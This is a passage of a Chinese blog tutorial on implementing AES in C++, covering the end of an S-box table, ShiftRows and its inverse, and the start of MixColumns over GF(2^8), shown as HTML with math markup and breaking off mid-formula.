class=\"number\">0x18</span>, <span class=\"number\">0xBE</span>, <span class=\"number\">0x1B</span>,</span><br><span class=\"line\">    <span class=\"number\">0xFC</span>, <span class=\"number\">0x56</span>, <span class=\"number\">0x3E</span>, <span class=\"number\">0x4B</span>, <span class=\"number\">0xC6</span>, <span class=\"number\">0xD2</span>, <span class=\"number\">0x79</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x9A</span>, <span class=\"number\">0xDB</span>, <span class=\"number\">0xC0</span>, <span class=\"number\">0xFE</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0xCD</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0xF4</span>,</span><br><span class=\"line\">    <span class=\"number\">0x1F</span>, <span class=\"number\">0xDD</span>, <span class=\"number\">0xA8</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x07</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x31</span>, <span class=\"number\">0xB1</span>, <span class=\"number\">0x12</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x59</span>, <span class=\"number\">0x27</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0xEC</span>, <span class=\"number\">0x5F</span>,</span><br><span class=\"line\">    <span class=\"number\">0x60</span>, <span class=\"number\">0x51</span>, <span class=\"number\">0x7F</span>, <span class=\"number\">0xA9</span>, <span class=\"number\">0x19</span>, <span class=\"number\">0xB5</span>, <span class=\"number\">0x4A</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x2D</span>, <span class=\"number\">0xE5</span>, <span class=\"number\">0x7A</span>, <span class=\"number\">0x9F</span>, <span class=\"number\">0x93</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x9C</span>, <span class=\"number\">0xEF</span>,</span><br><span class=\"line\">    <span class=\"number\">0xA0</span>, <span class=\"number\">0xE0</span>, <span class=\"number\">0x3B</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0xAE</span>, <span class=\"number\">0x2A</span>, <span class=\"number\">0xF5</span>, <span class=\"number\">0xB0</span>, <span class=\"number\">0xC8</span>, <span class=\"number\">0xEB</span>, <span class=\"number\">0xBB</span>, <span class=\"number\">0x3C</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0x53</span>, <span class=\"number\">0x99</span>, <span class=\"number\">0x61</span>,</span><br><span class=\"line\">    <span class=\"number\">0x17</span>, <span class=\"number\">0x2B</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x7E</span>, <span class=\"number\">0xBA</span>, <span class=\"number\">0x77</span>, <span class=\"number\">0xD6</span>, <span class=\"number\">0x26</span>, <span class=\"number\">0xE1</span>, <span class=\"number\">0x69</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0x63</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0x21</span>, <span class=\"number\">0x0C</span>, <span class=\"number\">0x7D</span>,</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"shiftrows-inverse\"><a class=\"anchor\" href=\"#shiftrows-inverse\">#</a> ShiftRows &amp; Inverse</h2>\n<p>这一变换比较简单，就是对表示为 4x4 矩阵的 16 字节数据，对第 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 行进行 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 字节轮转。（<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>0</mn><mo>≤</mo><mi>i</mi><mo>≤</mo><mn>3</mn></mrow><annotation encoding=\"application/x-tex\">0\\leq i\\leq 3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.78041em;vertical-align:-0.13597em;\"></span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≤</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.79549em;vertical-align:-0.13597em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≤</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">3</span></span></span></span>）</p>\n<p>所以显然第一行，也就是第 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span></span></span></span> 行进行 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span></span></span></span> 字节轮转是没有实际作用可以省略的。其过程如下图所示：</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/21/4aOSv6ZwFiTQoEf.png\" alt=\"\" width=\"67%\" /></p>\n<p>逆变换则如下所示：</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/21/Rai4HyTJ16UEkdv.png\" alt=\"\" width=\"67%\" /></p>\n<p>cpp 使用冒泡的方式处理如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// uint8_t c[16]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">ShiftRows</span><span class=\"params\">(<span class=\"type\">uint8_t</span> * c)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">1</span>], c[<span class=\"number\">5</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">5</span>], c[<span class=\"number\">9</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">9</span>], c[<span class=\"number\">13</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">2</span>], c[<span class=\"number\">10</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">6</span>], c[<span class=\"number\">14</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">15</span>], c[<span class=\"number\">11</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">11</span>], c[<span class=\"number\">7</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">7</span>], c[<span class=\"number\">3</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">InvShiftRows</span><span class=\"params\">(<span class=\"type\">uint8_t</span> * c)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">9</span>], c[<span class=\"number\">13</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">5</span>], c[<span class=\"number\">9</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">1</span>], c[<span class=\"number\">5</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">2</span>], c[<span class=\"number\">10</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">6</span>], c[<span class=\"number\">14</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">7</span>], c[<span class=\"number\">3</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">11</span>], c[<span class=\"number\">7</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">swap</span>(c[<span class=\"number\">15</span>], c[<span class=\"number\">11</span>]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"mixcolumns-inverse\"><a class=\"anchor\" href=\"#mixcolumns-inverse\">#</a> MixColumns &amp; Inverse</h2>\n<p>对表示为 4x4 矩阵的 16 字节数据，每一列 4 字节向量，视为一个 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi><mo>=</mo><msup><mn>2</mn><mn>8</mn></msup></mrow><annotation encoding=\"application/x-tex\">x=2^8</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span></span></span></span> 并且系数来自 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi>F</mi><mo stretchy=\"false\">(</mo><msup><mn>2</mn><mn>8</mn></msup><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">GF(2^8)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.064108em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> 的多项式</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>a</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><msub><mi>a</mi><mn>3</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mspace linebreak=\"newline\"></mspace><msub><mi>a</mi><mi>i</mi></msub><mo>∈</mo><mi>G</mi><mi>F</mi><mo stretchy=\"false\">(</mo><msup><mn>2</mn><mn>8</mn></msup><mo stretchy=\"false\">)</mo><mo separator=\"true\">,</mo><mtext>  </mtext><mi>x</mi><mo>=</mo><msup><mn>2</mn><mn>8</mn></msup></mrow><annotation encoding=\"application/x-tex\">a(x)=a_3x+a_2x+a_1x+a_0\\\\a_i\\in GF(2^8),\\ \\ x=2^8\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.73333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.73333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.73333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6891em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1141079999999999em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mpunct\">,</span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>AES 使用了一对可逆的多项式，通过对这两个多项式进行模乘实现变换和逆变换：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>b</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mo stretchy=\"false\">{</mo><mtext>0x03</mtext><mo stretchy=\"false\">}</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mo stretchy=\"false\">{</mo><mtext>0x01</mtext><mo stretchy=\"false\">}</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mo stretchy=\"false\">{</mo><mtext>0x01</mtext><mo stretchy=\"false\">}</mo><mi>x</mi><mo>+</mo><mo stretchy=\"false\">{</mo><mtext>0x02</mtext><mo stretchy=\"false\">}</mo><mspace linebreak=\"newline\"></mspace><msup><mi>b</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mo stretchy=\"false\">{</mo><mtext>0x0B</mtext><mo stretchy=\"false\">}</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mo stretchy=\"false\">{</mo><mtext>0x0D</mtext><mo stretchy=\"false\">}</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mo stretchy=\"false\">{</mo><mtext>0x09</mtext><mo stretchy=\"false\">}</mo><mi>x</mi><mo>+</mo><mo stretchy=\"false\">{</mo><mtext>0x0E</mtext><mo stretchy=\"false\">}</mo></mrow><annotation encoding=\"application/x-tex\">b(x)=\\{\\text{0x03}\\}x^3+\\{\\text{0x01}\\}x^2+\\{\\text{0x01}\\}x+\\{\\text{0x02}\\}\\\\\nb^{-1}(x)=\\{\\text{0x0B}\\}x^3+\\{\\text{0x0D}\\}x^2+\\{\\text{0x09}\\}x+\\{\\text{0x0E}\\}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1141079999999999em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord text\"><span class=\"mord\">0x03</span></span><span class=\"mclose\">}</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1141079999999999em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord text\"><span class=\"mord\">0x01</span></span><span class=\"mclose\">}</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord text\"><span class=\"mord\">0x01</span></span><span class=\"mclose\">}</span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord text\"><span class=\"mord\">0x02</span></span><span class=\"mclose\">}</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1141079999999999em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.864108em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1141079999999999em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord text\"><span class=\"mord\">0x0B</span></span><span class=\"mclose\">}</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1141079999999999em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord text\"><span class=\"mord\">0x0D</span></span><span class=\"mclose\">}</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord text\"><span class=\"mord\">0x09</span></span><span class=\"mclose\">}</span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord text\"><span class=\"mord\">0x0E</span></span><span class=\"mclose\">}</span></span></span></span></span></p>\n<p>于是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>⊗</mo><mi>b</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">a(x)\\otimes b(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span> 就可以表示为有限域 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi>F</mi><mo stretchy=\"false\">(</mo><msup><mn>2</mn><mn>8</mn></msup><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">GF(2^8)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.064108em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> 上的向量与可逆矩阵乘法：</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/21/gaH2SAdtkrPzcop.png\" alt=\"\" width=\"67%\" /></p>\n<p>同理，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>⊗</mo><msup><mi>b</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">a(x)\\otimes b^{-1}(x)</annotation></semantics></math></span><span 